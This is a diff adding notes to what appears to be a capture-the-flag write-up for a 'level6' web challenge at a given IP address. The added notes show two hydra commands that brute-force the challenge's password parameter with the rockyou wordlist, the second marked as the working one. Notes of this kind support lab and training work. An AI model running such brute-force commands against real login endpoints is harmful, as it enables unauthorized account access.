@@ -31,3 +31,16 @@ http://34.69.146.51:5000/level6/?password=3
 this does return invalid password
 
 so we will start with a python script and bruteforce the password.
+
+
+using hydra kali linux
+the only command i have got not bad command output is:
+```bash
+hydra -l dummy -P rockyou.txt 34.69.146.51 http-get "/level6/:password=^PASS^:S=success:F=Invalid password"
+```
+
+
+finaly the perfect command:
+```bash
+hydra -vV -l dummy -P rockyou.txt 34.69.146.51 http-get "/level6/?password=^PASS^:F=Invalid password" -s 5000
+```
